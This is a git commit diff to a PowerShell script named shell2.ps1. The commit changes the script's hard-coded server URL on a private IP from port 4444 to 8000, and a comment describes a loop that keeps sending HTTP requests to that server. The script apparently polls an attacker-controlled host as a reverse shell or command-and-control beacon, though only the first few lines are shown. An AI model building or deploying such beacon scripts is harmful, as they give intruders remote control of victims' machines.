ba21ef55d6e667c2b4acf96c8a10e2673f24cde5
Abykaam <139961889+Abykaam@users.noreply.github.com>
2024-05-08 09:01:34 +0530

    Update shell2.ps1

--- shell2.ps1
+++ shell2.ps1
@@ -1,5 +1,5 @@
 # Define the URL of the server endpoint
-$serverUrl = "http://192.168.166.197:4444"
+$serverUrl = "http://192.168.166.197:8000"
 
 # Loop to continuously make HTTP requests to the server
 while ($true) {
